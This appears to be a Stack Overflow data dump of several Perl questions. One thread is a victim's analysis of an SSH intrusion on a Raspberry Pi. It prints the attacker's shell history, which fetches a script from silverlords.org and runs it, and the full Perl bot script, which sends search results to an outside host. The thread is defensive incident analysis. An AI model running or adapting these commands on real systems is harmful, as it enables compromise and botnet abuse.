"https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1496523095, "post_id": 44348179, "comment_id": 75699315, "body": "Indeed, always use <code>use strict; use warnings qw( all );</code>!"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1496649787, "post_id": 44348179, "comment_id": 75729996, "body": "What is it with all the badly-formatted code we&#39;re seeing recently? I&#39;ve fixed it for you, but please do it yourself next time."}], "answers": [{"tags": [], "owner": {"reputation": 36, "user_id": 1245539, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uspSP.jpg?s=128&g=1", "display_name": "kyzn", "link": "https://stackoverflow.com/users/1245539/kyzn"}, "is_accepted": true, "score": 2, "last_activity_date": 1496522037, "creation_date": 1496522037, "answer_id": 44348319, "question_id": 44348179, "link": "https://stackoverflow.com/questions/44348179/array-ref-empty-when-received-by-a-sub/44348319#44348319", "title": "Array ref empty when received by a sub", "body": "<p>I think the problem is, loop being outside of <code>func</code>. You are calling <code>func</code> twice, and only after that you are looping through <code>$par</code>, which is undefined at the time.</p>\n\n<p>You might be looking for something like:</p>\n\n<pre><code>sub func{\n  my $par = shift;\n\n  print $par.\"\\n\";\n  print \"------------------------\\n\";\n\n  for my $elem (@$par){\n    print $elem.\"\\n\";\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 441, "user_id": 3718294, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/40bec26b5a8c26fb7d14b76272977459?s=128&d=identicon&r=PG&f=1", "display_name": "postoronnim", "link": "https://stackoverflow.com/users/3718294/postoronnim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 44348319, "answer_count": 1, "score": -1, "last_activity_date": 1496649749, "creation_date": 1496520837, "last_edit_date": 1496649749, "question_id": 44348179, "link": "https://stackoverflow.com/questions/44348179/array-ref-empty-when-received-by-a-sub", "title": "Array ref empty when received by a sub", "body": "<p>I am trying to access elements of arrays by reference, passing references into a sub. Here is my code snippet:</p>\n\n<pre><code>my @arr1 = (1,2);\nmy @arr2 = (3,4);\nmy @arr3;\n\npush @arr3, \\@arr1;\npush @arr3, \\@arr2;\n\nfor my $i (@arr3) {\n  print \"$i\\n\";\n}\n\nprint \"Entered Sub func()\\n\";\n\nfor my $i (@arr3) { \n  func($i);\n}\n\nsub func{\n  my $par = shift;\n  print $par.\"\\n\";\n}\nprint \"------------------------\\n\";\n\nfor my $elem(@$par) {\n  print $elem.\"\\n\";\n}\n</code></pre>\n\n<p>And here is the ouput:</p>\n\n<pre><code>C:\\Users\\ag194y&gt;perl arrs.pl\nARRAY(0x357b28)\nARRAY(0x3575e8)\nEntered Sub func()\nARRAY(0x357b28)\nARRAY(0x3575e8)\n------------------------\n\nC:\\Users\\ag194y&gt;\n</code></pre>\n\n<p>I was expecting to access the elements of @arr1 and a@rr2 with the for loop in the sub, but it looks like array refs are empty. What am I doing wrong? Many thanks.</p>\n"}, {"tags": ["perl", "unix", "find"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1496514689, "post_id": 44347240, "comment_id": 75697192, "body": "What&#39;s wrong with the code you have?"}, {"owner": {"reputation": 539, "user_id": 7162389, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wr6Gu.jpg?s=128&g=1", "display_name": "Harini", "link": "https://stackoverflow.com/users/7162389/harini"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496514875, "post_id": 44347240, "comment_id": 75697251, "body": "Any other efficient solution will be helpful@melpomene"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496514908, "post_id": 44347240, "comment_id": 75697262, "body": "Are you just asking for a code review?"}, {"owner": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "edited": false, "score": 1, "creation_date": 1496515346, "post_id": 44347240, "comment_id": 75697398, "body": "Perl has a <code>Find</code> module, so you could easily eliminate the dependency on a separate process for the command line <code>find</code>.  Whether that&#39;s more &quot;efficient&quot; or not, I can&#39;t say.  This is an OS/file system-bound task. Speed will be dependent on details that have nothing to do with your program."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1496542288, "post_id": 44347240, "comment_id": 75702710, "body": "I strongly suggest not to &quot;request&quot; things in your posts, specially not in a title. You <i>are</i> posting a question, so that&#39;s that.  (If you don&#39;t like my change go to &quot;edit&quot; link and edit or roll back to a previous version.).  Also, I suggest that you state what is wrong with the code you post, instead of your last line."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1496577416, "post_id": 44347240, "comment_id": 75709502, "body": "I&#39;m voting to close this because I don&#39;t understand what your question is. You appear to have written something that works; surely you don&#39;t want a collection of many ways to do the same thing?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1496637692, "post_id": 44347240, "comment_id": 75725224, "body": "What problem are you having?"}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1496541901, "last_edit_date": 1496541901, "creation_date": 1496541491, "answer_id": 44350110, "question_id": 44347240, "link": "https://stackoverflow.com/questions/44347240/find-all-instances-of-every-file-name-in-a-directory-tree/44350110#44350110", "title": "Find all instances of every file name in a directory tree", "body": "<p>It seems that you are looking for duplicate files, simply put.  </p>\n\n<p>A couple of approaches</p>\n\n<ul>\n<li><p>There is a module <a href=\"http://search.cpan.org/~tmtm/File-Find-Duplicates-1.00/lib/File/Find/Duplicates.pm\" rel=\"nofollow noreferrer\">File::Find::Duplicates</a>, what may just solve your problem directly.</p></li>\n<li><p>Use a module to find all files, say <a href=\"http://search.cpan.org/~rclamp/File-Find-Rule-0.34/lib/File/Find/Rule.pm\" rel=\"nofollow noreferrer\">File::Find::Rule</a>. Then use one of many ways to find duplicates in list(s), or use a hash (see <a href=\"https://stackoverflow.com/a/23862719/4653379\">this post</a>). Use MD5 to confirm that the <em>files</em> are the same.</p></li>\n</ul>\n\n<p>There are posts on SO on details mentioned above, and in fact on the whole topic, please search.</p>\n"}], "owner": {"reputation": 539, "user_id": 7162389, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wr6Gu.jpg?s=128&g=1", "display_name": "Harini", "link": "https://stackoverflow.com/users/7162389/harini"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "closed_date": 1496675930, "answer_count": 1, "score": -3, "last_activity_date": 1496579780, "creation_date": 1496514400, "last_edit_date": 1496579780, "question_id": 44347240, "link": "https://stackoverflow.com/questions/44347240/find-all-instances-of-every-file-name-in-a-directory-tree", "closed_reason": "Needs details or clarity", "title": "Find all instances of every file name in a directory tree", "body": "<p>This Perl script has a search function that searches for files in subdirectories that have the same filename.</p>\n\n<p>The output generated must be something like this:</p>\n\n<pre><code>file_name1: ~/X/file_name1 ~/?/??/file_name1\nfile_name2: ~/X/XYZ/file_name2 ~/?/?????/ ??/file_name2\n</code></pre>\n\n<p>I have tried the way using below:</p>\n\n<pre><code>find . -type f | perl -e'\n\nwhile ( &lt;&gt; ) { \n    chomp; \n    push @{ $h{ substr($_, rindex($_, \"/\") + 1) } }, $_;\n}\n\nfor $k (keys %h) { \n    next if @{ $h{$k} } &lt; 2; \n    print \"$k: @{ $h{$k} }\\n\"\n}'\n</code></pre>\n\n<p>Does anyone have another solution to this?</p>\n"}, {"tags": ["linux", "perl", "security", "raspberry-pi"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 6, "creation_date": 1496513926, "post_id": 44346821, "comment_id": 75696985, "body": "I&#39;m voting to close this question as off-topic because &quot;I don&#39;t know [language] and I don&#39;t have the time or energy to learn but what does this code do?&quot; is not a question about programming."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496514029, "post_id": 44346821, "comment_id": 75697012, "body": "@melpomene I partially agree, but it&#39;s a nice riddle for Pentecost. ;-)"}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1496566788, "post_id": 44346821, "comment_id": 75706783, "body": "Stack Overflow is a site for programming and development questions. This question appears to be off-topic because it is not about programming or development. See <a href=\"http://stackoverflow.com/help/on-topic\">What topics can I ask about here</a> in the Help Center. Perhaps <a href=\"http://superuser.com/\">Super User</a> or <a href=\"http://unix.stackexchange.com/\">Unix &amp; Linux Stack Exchange</a> would be a better place to ask. Also see <a href=\"http://meta.stackexchange.com/q/134306\">Where do I post questions about Dev Ops?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1496514809, "post_id": 44347165, "comment_id": 75697227, "body": "@melpomene: The contents of those text files in the <code>wget</code> commands are pretty weird. I don&#39;t recognise the data."}, {"owner": {"reputation": 3, "user_id": 8107858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1df3729d9e0abf0448af67bf97cf0b2?s=128&d=identicon&r=PG&f=1", "display_name": "Clay", "link": "https://stackoverflow.com/users/8107858/clay"}, "edited": false, "score": 0, "creation_date": 1496514851, "post_id": 44347165, "comment_id": 75697241, "body": "Wow thanks.  Any idea why they would do this though?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 3, "user_id": 8107858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1df3729d9e0abf0448af67bf97cf0b2?s=128&d=identicon&r=PG&f=1", "display_name": "Clay", "link": "https://stackoverflow.com/users/8107858/clay"}, "edited": false, "score": 0, "creation_date": 1496515053, "post_id": 44347165, "comment_id": 75697312, "body": "None at all. Do you understand the stuff in those text files? They are probably the files that contain the search phrases passed to the <code>bing</code> program"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1496515170, "post_id": 44347165, "comment_id": 75697345, "body": "I just added an answer which is more a comment on your answer. Not sure how to handle this; perhaps I&#39;ll delete it tomorrow."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1496515265, "post_id": 44347165, "comment_id": 75697370, "body": "It  may be a botnet that is doing millions of Bing searches across many machines and sending the results back to silverlords.org. That&#39;s all I can think of."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1496515426, "post_id": 44347165, "comment_id": 75697415, "body": "That&#39;s exactly what I thought. And given the list of IPs the OP&#39;s computer was logged-in from his computer was a nice victim."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 4, "last_activity_date": 1496514646, "last_edit_date": 1496514646, "creation_date": 1496513867, "answer_id": 44347165, "question_id": 44346821, "link": "https://stackoverflow.com/questions/44346821/after-securing-my-webserver-rpi-from-foreign-ssh-logins-i-found-this-perl-scr/44347165#44347165", "title": "After securing my webserver (rpi) from foreign ssh logins, I found this perl script on my computer. Can someone tell me what it does?", "body": "<p>It reads the file passed on the command line, and uses each line as a phrase to do a Bing search. It prints the URL of every search result returned by Bing, and also sends it to <code>http://post.silverlords.org/sites.php?site=$save</code> where <code>$save</code>is the URL</p>\n\n<p>It used to write the same URLs to the <code>output.HH.MM.SS.txt</code> files, but that line has been commented out so the files are created but left empty</p>\n\n<p>So it's just a command-line <code>bing</code> search; nothing too sinister. Essentially nothing that they couldn't run on any machine that has access to <code>bing</code></p>\n"}, {"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 1, "last_activity_date": 1496515103, "creation_date": 1496515103, "answer_id": 44347343, "question_id": 44346821, "link": "https://stackoverflow.com/questions/44346821/after-securing-my-webserver-rpi-from-foreign-ssh-logins-i-found-this-perl-scr/44347343#44347343", "title": "After securing my webserver (rpi) from foreign ssh logins, I found this perl script on my computer. Can someone tell me what it does?", "body": "<p>This is not an answer but merely an overlong comment about the observations I made.</p>\n\n<ul>\n<li>When I issue the <code>wget ... -O word</code> commands, it works for me and I receive two files full of words. Looks like a list of random words, maybe passwords for a brute-force attack:</li>\n</ul>\n\n<p><strong>first file:</strong> (excerpt)</p>\n\n<pre><code>kalcio\nkalciolaria\nkalciolariaconia2\nkalciov\nkalcistn\nkalcit\nkalcit\nkalcita\n...\n</code></pre>\n\n<p><strong>second file:</strong> (excerpt)</p>\n\n<pre><code>curious2s\ncurious2saab95\ncurious2:saab95\ncurious2see\ncurious2see\ncurious2squeak2\ncurious2swingineverton\nCurious2tender\ncurious2tryany2asdfg\nCURIOUS2TRYIT\ncurious2trythre092703\n...\n</code></pre>\n\n<ul>\n<li><p>The Perl script <code>bing</code> is written by someone who's not familiar with Perl. He uses beginner's style from bad tutorials and/or obviously doesn't know the language very well.</p></li>\n<li><p>Because he issued <code>su clay</code> he might know that such a user (presumably <em>your</em> user) even exists on that machine, without examining <code>/etc/passwd</code> or similar.</p></li>\n<li><p>As @borodin and @melpomene say, the script searches <code>bing</code> for these words and then parses the resulting bing-page for URLs and then submits them to <code>post.silverlords.org</code>.</p></li>\n</ul>\n\n<p>As the script currently is, it only abuses your computer's CPU and network to get its work done. The \"work\" is to massively submit Bing searches for all the words and collect the results at <code>post.silverlords.org</code>.</p>\n"}], "owner": {"reputation": 3, "user_id": 8107858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1df3729d9e0abf0448af67bf97cf0b2?s=128&d=identicon&r=PG&f=1", "display_name": "Clay", "link": "https://stackoverflow.com/users/8107858/clay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 156, "favorite_count": 0, "closed_date": 1496566788, "accepted_answer_id": 44347165, "answer_count": 2, "score": -1, "last_activity_date": 1496525641, "creation_date": 1496511407, "last_edit_date": 1496525641, "question_id": 44346821, "link": "https://stackoverflow.com/questions/44346821/after-securing-my-webserver-rpi-from-foreign-ssh-logins-i-found-this-perl-scr", "closed_reason": "Not suitable for this site", "title": "After securing my webserver (rpi) from foreign ssh logins, I found this perl script on my computer. Can someone tell me what it does?", "body": "<p>There was an account named \"user\" that would be used for these logins, which would be from all over the world. I spent several hours yesterday securing the computer and there have been no logins since that time.  I <code>awk</code>ed the /var/log/auth.log into a list of ips ordered from oldest to most recent login, if that somehow helps:</p>\n\n<pre><code>    185.145.252.26\n    185.145.252.36\n    109.236.83.3\n    104.167.2.4\n    217.23.13.125\n    185.38.148.238\n    194.88.106.146\n    43.225.107.70\n    194.88.107.163\n    192.162.101.217\n    62.112.11.88\n    194.63.141.141\n    194.88.107.162\n    74.222.19.247\n    194.88.107.164\n    178.137.184.237\n    167.114.210.108\n    5.196.76.41\n    118.70.72.25\n    109.236.91.85\n    62.112.11.222\n    91.195.103.172\n    62.112.11.94\n    62.112.11.90\n    188.27.75.73\n    194.88.106.197\n    194.88.107.165\n    38.84.132.236\n    91.197.235.11\n    62.112.11.79\n    62.112.11.223\n    144.76.112.21\n    185.8.7.144\n    91.230.47.91\n    91.230.47.92\n    91.195.103.189\n    91.230.47.89\n    91.230.47.90\n    109.236.89.72\n    195.228.11.82\n    109.236.92.184\n    46.175.121.38\n    94.177.190.188\n    171.251.76.179\n    173.212.230.79\n    144.217.75.30\n    5.141.202.235\n    31.207.47.36\n    62.112.11.86\n    217.23.2.183\n    217.23.1.87\n    154.122.98.44\n    41.47.42.128\n    41.242.137.33\n    171.232.175.131\n    41.114.123.190\n    1.54.115.72\n    108.170.8.185\n    86.121.85.122\n    91.197.232.103\n    160.0.224.69\n    217.23.2.77\n    212.83.171.102\n    41.145.17.243\n    62.112.11.81\n    82.79.252.36\n    41.114.63.134\n    5.56.133.126\n    109.120.131.106\n    76.68.108.151\n    113.20.108.27\n    46.246.61.20\n    146.185.28.52\n    45.32.219.199\n</code></pre>\n\n<p>One of the first things I did after changing the password of the \"user\" account was running <code>history</code>, which gave me this result:</p>\n\n<pre><code>1  sudo\n2  sudo\n3  sudo service vsftpd stop\n4  su clay\n5  unset PROMPT_COMMAND\n6  PS1='[PEXPECT]\\$'\n7  wget http://xpl.silverlords.org/bing -O bing\n8  wget http://www.silverlords.org/wordlist/xaaaaaaaaqb.txt -O word ; perl bing word\n9  wget http://www.silverlords.org/wordlist/xaaaaaaaaiv.txt -O word ; perl bing word\n10  uname\n11  n\n12  uname\n13  history\n</code></pre>\n\n<p>I then ran <code>cat /home/user/.bash_history</code> for more but what I already had was all that was in the file.<br><br>\nIn \"user\"'s home folder, I found four files, <code>bing</code>,  <code>output.13.19.27.txt</code> , <code>output.16.10.38.txt</code>, and  <code>word</code>.  All were empty except bing, which was a perl script:</p>\n\n<pre><code>#!/usr/bin/perl                                                            \nuse strict;                                                          \nuse LWP::UserAgent;                                                                 \nuse LWP::Simple;                                                                    \nuse POSIX qw(strftime);                                                             \nmy $data = strftime \"%H.%M.%S\", gmtime;                                             \n\nmy $ARGC = @ARGV;                                                                   \nif ($ARGC !=1) {                                                                    \n        printf \"$0 arquivo.txt\\n\";                                                  \n        printf \"Coded by: Al3xG0 x@~\\n\";                                            \n        exit(1);                                                                    \n}\nmy $st = rand();\nmy $filename = $ARGV[0];\nprint \"Input Filename - $filename\\n\";\n\nmy $max_results = 2;\n\nopen (IFH, \"&lt; $filename\") or die $!;\nopen (OFH, \"&gt; output.${data}.txt\") or die $!;\n\nwhile (&lt;IFH&gt;) {\n        next if /^ *$/;\n        my $search_word = $_;\n        $search_word =~ s/\\n//;\n        print \"Results for -$search_word-\\n\";\n        for (my $i = 0; $i &lt; $max_results; $i += 10) {\n                my $b = LWP::UserAgent-&gt;new(agent =&gt; 'Mozilla/4.8 [en] (Windows NT 6.0; U)');\n                $b-&gt;timeout(30); $b-&gt;env_proxy;\n                my $c = $b-&gt;get('http://www.bing.com/search?q=' . $search_word . '&amp;first=' . $i . '&amp;FORM=PERE')-&gt;content;\n                my $check = index($c, 'sb_pagN');\n                if ($check == -1) { last; }\n                while (1) { \n                        my $n = index($c, '&lt;h2&gt;&lt;a href=\"');\n                        if ($n == -1) { last; }\n                        $c = substr($c, $n + 13);\n                        my $s = substr($c, 0, index($c, '\"'));\n                        my $save = undef;\n                        if ($s =~ /http:\\/\\/([^\\/]+)\\//g) { $save = $s; }\n                        print \"$save\\n\";\n                        #if ($save !~ /^ *$/) { print OFH \"$save\\n\"; print \"$save\\n\"};\n                        getprint(\"http://post.silverlords.org/sites.php?site=$save\");\n                }\n        }\n        print \"\\n\";\n}\nclose (IFH);\nclose (OFH);\n</code></pre>\n\n<p>I don't know perl, and after spending so much time with sshd config, blacklists, etc., I don't really have the time or energy to learn.  If anyone could tell me what the script does and/or what the attackers were trying to do that would be great.</p>\n\n<p>Thanks so much,<br>\nClay</p>\n\n<p>EDIT: I found this article that could explain the purpose of the bing search script: <a href=\"https://www.wired.com/2013/02/microsoft-bing-fights-botnets/\" rel=\"nofollow noreferrer\">https://www.wired.com/2013/02/microsoft-bing-fights-botnets/</a></p>\n"}, {"tags": ["perl", "argv"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 4, "creation_date": 1496509009, "post_id": 44346373, "comment_id": 75695488, "body": "What do you mean, &quot;<i>this use of Getopt::Long</i>&quot;? That code doesn&#39;t use any module."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496509137, "post_id": 44346373, "comment_id": 75695525, "body": "By convention, most commands use single-letter options with a hyphen (<code>-a -b -c</code>) and long options with a double hyphen (<code>--foo --bar</code>). Your syntax is a bit weird."}, {"owner": {"reputation": 377, "user_id": 5373538, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh5.googleusercontent.com/-GxkXfmMS09k/AAAAAAAAAAI/AAAAAAAAAVE/5swI3yJ70nE/photo.jpg?sz=128", "display_name": "genesi5", "link": "https://stackoverflow.com/users/5373538/genesi5"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496509351, "post_id": 44346373, "comment_id": 75695596, "body": "@melpomene It&#39;s actually in <code>use</code>, i just brought a piece of code."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496509423, "post_id": 44346373, "comment_id": 75695616, "body": "Your code may load <code>Getopt::Long</code>, but it still doesn&#39;t make use of it. Why bother writing <code>use Getopt::Long</code> when you&#39;re going to parse <code>@ARGV</code> by hand?"}, {"owner": {"reputation": 377, "user_id": 5373538, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh5.googleusercontent.com/-GxkXfmMS09k/AAAAAAAAAAI/AAAAAAAAAVE/5swI3yJ70nE/photo.jpg?sz=128", "display_name": "genesi5", "link": "https://stackoverflow.com/users/5373538/genesi5"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496509459, "post_id": 44346373, "comment_id": 75695627, "body": "@melpomene the question is how to grab argv as hash, and not alowing the situation like <code>perl script.pl -qp -pr</code> where <code>-qp</code> gets <code>-pr</code> and not <code>undef</code>."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1496509638, "post_id": 44346373, "comment_id": 75695683, "body": "... why? That&#39;s completely unlike how any other command-line program works. It looks like the reason you&#39;re having trouble getting this to work &quot;properly&quot; is that your definition of &quot;proper&quot; would be considered broken by getopt standards."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1496510211, "post_id": 44346373, "comment_id": 75695850, "body": "I agree with @melpomene. If you want that behaviour, you need to build it yourself."}], "answers": [{"tags": [], "owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "is_accepted": false, "score": 5, "last_activity_date": 1615837888, "last_edit_date": 1615837888, "creation_date": 1496510260, "answer_id": 44346646, "question_id": 44346373, "link": "https://stackoverflow.com/questions/44346373/perl-how-to-read-argv-as-hash/44346646#44346646", "title": "Perl, how to read argv as hash?", "body": "<p>A quick example from the docs of <code>Getopt::Long</code>.</p>\n<p>You could now call this script with <code>script --qp=file1 --pr=file2 --rp=file2</code></p>\n<p>What <code>Getopt:Long</code> does for you is sort out the values given on command line to where you tell it to put them, as well as some basic validation (the <code>=s</code> here means you're expecting a string).</p>\n<p>If you want to check, for example, that the given files exist, you need to do that by hand.</p>\n<pre><code>use strict;\nuse warnings;\n\nuse Getopt::Long;\n\nmy ($qp,$pr,$rp);\nmy $verbose;\n\nGetOptions (\n    &quot;qp=s&quot; =&gt; \\$qp,\n    &quot;pr=s&quot; =&gt; \\$pr,\n    &quot;rp=s&quot; =&gt; \\$rp,\n    &quot;verbose&quot; =&gt; \\$verbose,\n) or die &quot;Error in command line arguments&quot;;\n\nprint &quot;Being verbose.\\n&quot; if $verbose;\n\n# Quick check all are there if they're all required (?)\ndie &quot;qp,pr and rp are required!&quot; if grep{ !$_ }($qp,$pr,$rp);\n\nfor my $fn ( $qp,$pr,$rp ){\n    die &quot;Cannot find file '$fn'&quot; unless -f $fn;\n}\n\nprint &quot;you've given: qp $qp, pr $pr, rp $rp.\\n&quot;;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": 